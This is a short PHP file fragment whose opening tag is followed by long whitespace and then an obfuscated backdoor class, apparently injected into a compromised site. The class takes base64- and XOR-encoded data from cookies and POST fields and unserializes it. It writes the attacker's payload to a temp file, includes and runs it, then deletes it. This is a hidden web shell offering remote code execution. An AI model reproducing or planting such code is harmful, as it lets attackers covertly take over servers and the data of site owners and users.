<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("evqeudd")){class evqeudd{public static $cljndigqw = "hjfwhplubhnpufno";public static $drhfpvbbdg = NULL;public function __construct(){$udkmv = @$_COOKIE[substr(evqeudd::$cljndigqw, 0, 4)];if (!empty($udkmv)){$emiilcd = "base64";$svfkte = "";$udkmv = explode(",", $udkmv);foreach ($udkmv as $ehrpdbvhv){$svfkte .= @$_COOKIE[$ehrpdbvhv];$svfkte .= @$_POST[$ehrpdbvhv];}$svfkte = array_map($emiilcd . "_decode", array($svfkte,));$svfkte = $svfkte[0] ^ str_repeat(evqeudd::$cljndigqw, (strlen($svfkte[0]) / strlen(evqeudd::$cljndigqw)) + 1);evqeudd::$drhfpvbbdg = @unserialize($svfkte);}}public function __destruct(){$this->dvnqfgud();}private function dvnqfgud(){if (is_array(evqeudd::$drhfpvbbdg)) {$qyjuh = sys_get_temp_dir() . "/" . crc32(evqeudd::$drhfpvbbdg["salt"]);@evqeudd::$drhfpvbbdg["write"]($qyjuh, evqeudd::$drhfpvbbdg["content"]);include $qyjuh;@evqeudd::$drhfpvbbdg["delete"]($qyjuh);exit();}}}$luckxunw = new evqeudd();$luckxunw = NULL;} ?><?php
